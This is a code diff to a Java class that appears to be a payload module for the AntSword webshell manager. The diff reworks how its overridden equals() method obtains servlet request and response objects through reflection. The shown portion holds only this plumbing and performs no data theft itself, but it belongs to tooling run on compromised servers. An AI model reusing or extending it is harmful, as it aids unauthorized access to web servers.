@@ -1,6 +1,5 @@
 import javax.servlet.http.HttpServletRequest;
 import javax.servlet.http.HttpServletResponse;
-import javax.servlet.jsp.PageContext;
 import java.io.ByteArrayOutputStream;
 import java.lang.reflect.Field;
 import java.sql.*;
@@ -14,35 +13,41 @@ public class Show_columns {
 
     @Override
     public boolean equals(Object obj) {
-    if (obj instanceof PageContext) {
-            PageContext page = (PageContext) obj;
-            request = (HttpServletRequest) page.getRequest();
-            response = (HttpServletResponse) page.getResponse();
-        } else if (obj instanceof HttpServletRequest) {
-            request = (HttpServletRequest) obj;
-            try {
-                Field req = request.getClass().getDeclaredField("request");
-                req.setAccessible(true);
-                HttpServletRequest request2 = (HttpServletRequest) req.get(request);
-                Field resp = request2.getClass().getDeclaredField("response");
-                resp.setAccessible(true);
-                response = (HttpServletResponse) resp.get(request2);
-            } catch (Exception e) {
-                e.printStackTrace();
+        try{
+            if(Class.forName("javax.servlet.jsp.PageContext").isInstance(obj)){
+                Class clazz = Class.forName("javax.servlet.jsp.PageContext");
+                request = (HttpServletRequest) clazz.getDeclaredMethod("getRequest").invoke(obj);
+                response = (HttpServletResponse) clazz.getDeclaredMethod("getResponse").invoke(obj);
             }
+        }catch (ClassNotFoundException | NoSuchMethodException pageContextErrorExection) {
+            if (obj instanceof HttpServletRequest) {
+                request = (HttpServletRequest) obj;
+                try {
+                    Field req = request.getClass().getDeclaredField("request");
+                    req.setAccessible(true);
+                    HttpServletRequest request2 = (HttpServletRequest) req.get(request);
+                    Field resp = request2.getClass().getDeclaredField("response");
+                    resp.setAccessible(true);
+                    response = (HttpServletResponse) resp.get(request2);
+                } catch (Exception e) {
+                    e.printStackTrace();
+                }
 
-        } else if (obj instanceof HttpServletResponse) {
-            response = (HttpServletResponse) obj;
-            try {
-                Field resp = response.getClass().getDeclaredField("response");
-                resp.setAccessible(true);
-                HttpServletResponse response2 = (HttpServletResponse) resp.get(response);
-                Field req = response2.getClass().getDeclaredField("request");
-                req.setAccessible(true);
-                request = (HttpServletRequest) req.get(response2);
-            } catch (Exception e) {
-                e.printStackTrace();
+            } else if (obj instanceof HttpServletResponse) {
+                response = (HttpServletResponse) obj;
+                try {
+                    Field resp = response.getClass().getDeclaredField("response");
+                    resp.setAccessible(true);
+                    HttpServletResponse response2 = (HttpServletResponse) resp.get(response);
+                    Field req = response2.getClass().getDeclaredField("request");
+                    req.setAccessible(true);
+                    request = (HttpServletRequest) req.get(response2);
+                } catch (Exception e) {
+                    e.printStackTrace();
+                }
             }
+        }catch (Exception e) {
+            e.printStackTrace();
         }
         randomPrefix = "antswordrandomPrefix";
         encoder = "base64";
